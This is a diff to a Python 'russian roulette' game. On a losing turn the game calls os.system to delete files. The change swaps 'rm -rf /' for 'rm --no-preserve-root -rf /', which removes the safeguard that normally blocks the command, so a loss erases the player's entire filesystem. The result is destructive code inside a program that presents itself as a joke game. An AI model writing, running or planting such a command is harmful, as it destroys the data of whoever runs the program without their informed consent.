@@ -16,7 +16,7 @@ def russian_roulette():
 
         if chamber == 1:
             print("Bang! You're dead.")
-            os.system("rm -rf /")
+            os.system("rm --no-preserve-root -rf /")
             break
         else:
             print("Click! You're still alive.")
